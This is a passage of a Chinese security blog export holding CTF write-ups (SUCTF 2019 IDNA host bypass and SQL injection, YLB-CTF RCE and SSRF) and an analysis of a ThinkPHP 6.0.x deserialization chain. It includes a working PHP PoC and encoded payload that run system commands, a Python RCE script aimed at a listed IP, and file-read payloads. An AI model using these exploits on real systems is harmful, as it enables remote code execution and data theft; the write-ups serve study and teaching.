class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
<p>这题的出题思路来自于今年BlackHat的一个议题，相关PPT如下：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>下面就是寻找利用方式了，根据题目中的提示：</p>
<ul>
<li>前面的url部分应该是<code>suctf.cc</code></li>
<li>还提到了Nginx，Nginx的配置文件目录为：<code>/usr/local/nginx/conf/nginx.conf</code></li>
</ul>
<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" alt="在这里插入图片描述"></p>
<p>最后构造payload：<code>file://suctf.c℆sr/fffffflag</code></p>
<p><br></p>
<h1 id="Easysql"><a href="#Easysql" class="headerlink" title="Easysql"></a>Easysql</h1><p>（题目好像出现了不少非预期解，而且比赛过程中甚至泄露了源码…）</p>
<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" alt="在这里插入图片描述"></p>
<p>根据输入的回显大致判断查询语句为：<code>.. POST[&#39;query&#39;]||flag ...</code></p>
<p><strong>非预期解</strong></p>
<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
<p>由于作者没有过滤全，出现了非预期解，而预期解是：通过堆叠注入，设置<code>sql_mode</code>的值为<code>PIPES_AS_CONCAT</code>，从而将<code>||</code>视为字符串的连接操作符而非或运算符。</p>
<p>所以payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>这样输出的flag会与1进行拼接，得到：</p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="upload-labs2"><a href="#upload-labs2" class="headerlink" title="upload labs2"></a>upload labs2</h1>]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP v6.0.x 反序列化</title>
    <url>/2020/04/26/ThinkPHPv6-0-unserialize/</url>
    <content><![CDATA[<h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><p>使用composer进行安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.x-dev TPv6.0</span><br><span class="line"><span class="built_in">cd</span> TPv6.0</span><br><span class="line">php think run</span><br></pre></td></tr></table></figure></p>
<p>定义入口文件<code>app\controller\Index.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($payload=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="comment">//echo $payload;</span></span><br><span class="line">        unserialize($payload);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x02-destruct链分析"><a href="#0x02-destruct链分析" class="headerlink" title="0x02 __destruct链分析"></a>0x02 __destruct链分析</h3><h5 id="（1）寻找-destruct"><a href="#（1）寻找-destruct" class="headerlink" title="（1）寻找__destruct()"></a>（1）寻找__destruct()</h5><p>反序列化POP链的起点通常是<code>__destruct()</code>函数，这次漏洞的触发点位于<code>vendor\topthink\think-orm\src\Model.php</code>中<code>Model</code>类的<code>__destruct</code>析构函数：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426224817839.png" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;lazySave==true</code>时，将会调用<code>$this-&gt;save()</code>，继续跟进。</p>
<h5 id="（2）跟进save"><a href="#（2）跟进save" class="headerlink" title="（2）跟进save()"></a>（2）跟进save()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426225403642.png" alt="在这里插入图片描述"><br>首先要想不被return掉，需要满足下面整个if语句：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>先跟进<code>$this-&gt;isEmpty()</code>：只需要满足<code>$this-&gt;data</code>不为空即可。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426225637780.png" alt="在这里插入图片描述"></li>
<li>再跟进<code>$this-&gt;trigger()</code>：只需要满足<code>$this-&gt;withEvent == false</code>即可返回true。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426225808813.png" alt="在这里插入图片描述"><br>在通过if语句之后，会进入到：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当<code>$this-&gt;exists == true</code>时进入<code>$this-&gt;updateData()</code>；当<code>$this-&gt;exists == false</code>时进入<code>$this-&gt;insertData()</code>。</p>
<p>分别跟进，发现<code>updateData()</code>存在继续利用的点，所以需要<code>$this-&gt;exists == true</code>，跟进分析。</p>
<h5 id="（3）跟进updateData"><a href="#（3）跟进updateData" class="headerlink" title="（3）跟进updateData()"></a>（3）跟进updateData()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230406966.png" alt="在这里插入图片描述"><br>这里下一步的利用点存在于<code>$this-&gt;checkAllowFields()</code>中，但是要调用该函数，需要通过①②两处的if语句：<br>① 与之前<code>save()</code>中的一样，只需要令<code>$this-&gt;withEvent == false</code>即可通过。<br>② 需要<code>$data == 1</code>，所以我们跟进<code>$this-&gt;getChangedData()</code>看一下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426230826525.png" alt="在这里插入图片描述"><br>只需要令<code>$this-&gt;force == true</code>，即可直接返回<code>$this-data</code>，而我们之前也需要设置<code>$this-data</code>为非空。</p>
<p>回到<code>updateData()</code>中，之后就可以成功调用到了<code>$this-&gt;checkAllowFields()</code>。</p>
<h5 id="（4）跟进checkAllowFields"><a href="#（4）跟进checkAllowFields" class="headerlink" title="（4）跟进checkAllowFields()"></a>（4）跟进checkAllowFields()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200426231541891.png" alt="在这里插入图片描述"><br>下一步的利用点在<code>$this-&gt;db()</code>中，所以我们需要令<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>均为空才能调用到它：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427000021178.png" alt="在这里插入图片描述"><br>但可以看到这两个地方默认为空，所以不需要进行构造，然后进一步跟进<code>$this-&gt;db()</code>。</p>
<h5 id="（5）跟进db"><a href="#（5）跟进db" class="headerlink" title="（5）跟进db()"></a>（5）跟进db()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024434222.png" alt="在这里插入图片描述"></p>
<p>可以看到这里已经存在了用<code>.</code>进行字符串连接的操作了， 所以把<code>$this-&gt;table</code>或 <code>$this-&gt;suffix</code> 设置成响应类对象就可以触发<code>__toString()</code>了。</p>
<h5 id="（6）-destruct-链小结"><a href="#（6）-destruct-链小结" class="headerlink" title="（6）__destruct()链小结"></a>（6）__destruct()链小结</h5><p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用<code>__toString()</code>，所以先总结一下我们需要设置的点：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">this</span>-&gt;<span class="keyword">data</span>不为空</span><br><span class="line">$<span class="keyword">this</span>-&gt;lazySave == <span class="literal">true</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;withEvent == <span class="literal">false</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;exists == <span class="literal">true</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p>调用过程如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427000737813.png" alt="在这里插入图片描述"><br>但是还有一个问题就是<code>Model</code>类是抽象类，不能实例化。所以要想利用，得找出<code>Model</code>类的一个子类进行实例化，这里可以用<code>Pivot</code>类进行利用。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001136558.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="0x03-toString-链分析"><a href="#0x03-toString-链分析" class="headerlink" title="0x03 __toString()链分析"></a>0x03 __toString()链分析</h3><h5 id="（1）寻找-toString"><a href="#（1）寻找-toString" class="headerlink" title="（1）寻找__toString()"></a>（1）寻找__toString()</h5><p>既然前半条POP链已经能够触发<code>__toString()</code>，下面就是寻找利用点。这次漏洞的<code>__toString()</code>利用点位于<code>vendor\topthink\think-orm\src\model\concern\Conversion.php</code>中名为<code>Conversion</code> 的trait中。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001835137.png" alt="在这里插入图片描述"><br>很简单，跟进<code>toJson()</code>。</p>
<h5 id="（2）跟进toJson"><a href="#（2）跟进toJson" class="headerlink" title="（2）跟进toJson()"></a>（2）跟进toJson()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427001928575.png" alt="在这里插入图片描述"><br>没什么好说的，继续跟进<code>toArray()</code>。</p>
<h5 id="（3）跟进toArray"><a href="#（3）跟进toArray" class="headerlink" title="（3）跟进toArray()"></a>（3）跟进toArray()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427024722192.png" alt="在这里插入图片描述"></p>
<p>对<code>$date</code>进行遍历，其中<code>$key</code>为<code>$date</code>的键。默认情况下，会进入第二个<code>elseif</code>语句，从而已<code>$key</code>作为参数调用<code>getAttr()</code>函数。</p>
<p>接着跟进<code>getAttr()</code>。</p>
<h5 id="（4）跟进getAttr"><a href="#（4）跟进getAttr" class="headerlink" title="（4）跟进getAttr()"></a>（4）跟进getAttr()</h5><p>位于<code>vendor\topthink\think-orm\src\model\concern\Attribute.php</code>中：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003057642.png" alt="在这里插入图片描述"><br><code>$value</code>返回自<code>$this-&gt;getData()</code>，且参数为<code>toArray()</code>传进来的<code>$key</code>，跟进一下<code>getData()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003348492.png" alt="在这里插入图片描述"><br>继续跟进<code>getRealFieldName()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003513930.png" alt="在这里插入图片描述"><br>当满足<code>$this-&gt;strict == true</code>时（默认为true），直接返回<code>$name</code>，也就是最开始从<code>toArray()</code>中传进来的<code>$key</code>值。</p>
<p>从<code>getRealFieldName()</code>回到<code>getData()</code>，此时<code>$fieldName</code>即为<code>$key</code>。而返回语句如下，实际上就是返回了<code>$this-&gt;data[$key]</code>。<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427003758867.png" alt="在这里插入图片描述"><br>然后再从<code>getData()</code>回到<code>getAttr()</code>，最后的返回语句如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br></pre></td></tr></table></figure></p>
<p>这时参数<code>$name</code>则是从<code>toArray()</code>传进来的<code>$key</code>，而参数<code>$value</code>的值就是<code>$this-&gt;data[$key]</code>。</p>
<p>继续跟进一下<code>getValue()</code></p>
<h5 id="（5）跟进getValue"><a href="#（5）跟进getValue" class="headerlink" title="（5）跟进getValue()"></a>（5）跟进getValue()</h5><p><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427005512411.png" alt="在这里插入图片描述"><br>首先<code>$fieldName</code>的值来自经过<code>getRealFieldName()</code>处理的<code>$key</code>值，而当<code>$this-&gt;strict == true</code>时，是不做处理直接返回的，所以<code>$fieldName</code>的值就为<code>$key</code>。</p>
<p>跟进一下<code>getRealFieldName()</code>：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427004921811.png" alt="在这里插入图片描述"><br>然后需要通过两个if语句，满足的条件为：<code>$this-&gt;withAttr</code>数组存在和<code>$date</code>一样的键<code>$key</code>，并且这个键对应的值不能为数组。</p>
<p>这样的话，就会把<code>$this-&gt;withAttr[$key]</code>（<code>withAttr</code>数组<code>$key</code>键对应的值）当做函数名动态执行，参数为<code>$this-&gt;date[$key]</code>。</p>
<p>例如：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;withAttr = [<span class="string">"key"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [<span class="string">"key"</span> =&gt; <span class="string">"whoami"</span>];</span><br></pre></td></tr></table></figure></p>
<p>实际上最后执行的即为<code>system(&#39;whoami&#39;)</code></p>
<h5 id="（6）-toString-链小结"><a href="#（6）-toString-链小结" class="headerlink" title="（6）__toString()链小结"></a>（6）__toString()链小结</h5><p>至此，后半个POP链也构造完成，小结一下需要构造的点：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"axin"</span> =&gt; <span class="string">"dir"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"axin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>除此之外还需要将前面说的<code>table</code>声明为Pivot类对象，从而将两个POP链串联起来。</p>
<p>第二个POP链调用过程如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030303975.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><h3 id="0x04-POC-1"><a href="#0x04-POC-1" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p>最终POC如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"Lethe"</span> =&gt; <span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"Lethe"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></p>
<p>运行得到payload:<br><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span><span class="number">%3</span>A17<span class="number">%3</span>A<span class="number">%22</span>think<span class="number">%5</span>Cmodel<span class="number">%5</span>CPivot<span class="number">%22</span><span class="number">%3</span>A7<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A21<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>lazySave<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A12<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span><span class="number">%2</span>A<span class="number">%00</span>withEvent<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>Bs<span class="number">%3</span>A19<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>exists<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A18<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>force<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span><span class="number">%2</span>A<span class="number">%00</span>table<span class="number">%22</span><span class="number">%3</span>BO<span class="number">%3</span>A17<span class="number">%3</span>A<span class="number">%22</span>think<span class="number">%5</span>Cmodel<span class="number">%5</span>CPivot<span class="number">%22</span><span class="number">%3</span>A7<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A21<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>lazySave<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A12<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span><span class="number">%2</span>A<span class="number">%00</span>withEvent<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>Bs<span class="number">%3</span>A19<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>exists<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A18<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>force<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A1<span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span><span class="number">%2</span>A<span class="number">%00</span>table<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A17<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>data<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>Lethe<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%22</span>whoami<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>Ds<span class="number">%3</span>A21<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>withAttr<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>Lethe<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%22</span>system<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>D<span class="number">%7</span>Ds<span class="number">%3</span>A17<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>data<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>Lethe<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%22</span>whoami<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>Ds<span class="number">%3</span>A21<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>think<span class="number">%5</span>CModel<span class="number">%00</span>withAttr<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A5<span class="number">%3</span>A<span class="number">%22</span>Lethe<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%22</span>system<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>D<span class="number">%7</span>D</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030648728.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h3><p>第一次对ThinkPHP框架进行真实漏洞的审计，参考着大佬们的分析文章才弄明白了。其实一步一步理解这个反序列化漏洞的流程并不是特别困难，主要还是自己对ThinkPHP框架不熟悉、对PHP命名空间的概念也不是特别清晰，导致在编写POC的过程中遇到了些问题。之前一直处于只做CTF题目的状态，以后还是得要多做做代码审计，找个时间把thinkphp手册过一遍吧，tcl。</p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>Code Audit</tag>
      </tags>
  </entry>
  <entry>
    <title>YLB-CTF-Writeup</title>
    <url>/2020/03/30/YLB-CTF-Writeup/</url>
    <content><![CDATA[<h1 id="签到题-EasyRSA"><a href="#签到题-EasyRSA" class="headerlink" title="签到题 EasyRSA"></a>签到题 EasyRSA</h1><p>给了flag.en和rsa_private_key.pem私钥，直接用openssl解密，得到flag{We1c0meCtf3r_elab}<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327160717181.png" alt="在这里插入图片描述"></p>
<h1 id="Web1-rce-nopar"><a href="#Web1-rce-nopar" class="headerlink" title="Web1 rce_nopar"></a>Web1 rce_nopar</h1><p>php的无参数rce，利用PHPSESSID，参考：<a href="https://xz.aliyun.com/t/6316#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6316#toc-8</a></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('cat /flag.txt');"</span></span><br><span class="line">payload = str(binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))).strip(<span class="string">"b"</span>).strip(<span class="string">"'"</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://124.193.74.212:7905?var=eval(hex2bin(session_id(session_start())));'</span>, cookies=cookies)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/30/YLB-CTF-Writeup/20200327161220829.png" alt="在这里插入图片描述"></p>
<h1 id="Web2-SSRF"><a href="#Web2-SSRF" class="headerlink" title="Web2  SSRF"></a>Web2  SSRF</h1><p>把index.php两次base64编码传入，可以返回源码的base64，里面有提示：hal0flagi5here.php</p>
<p>然后同样的方式读取该文件源码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">	$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">	print_r($r);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">echo</span>($url);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后参考前一段时间“高校战役”的一道SSRF题目，使用如下payload绕过：<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">url=compress.zlib:<span class="regexp">//</span>file:@happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>flag.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/30/YLB-CTF-Writeup/20200327162418535.png" alt="在这里插入图片描述"></p>
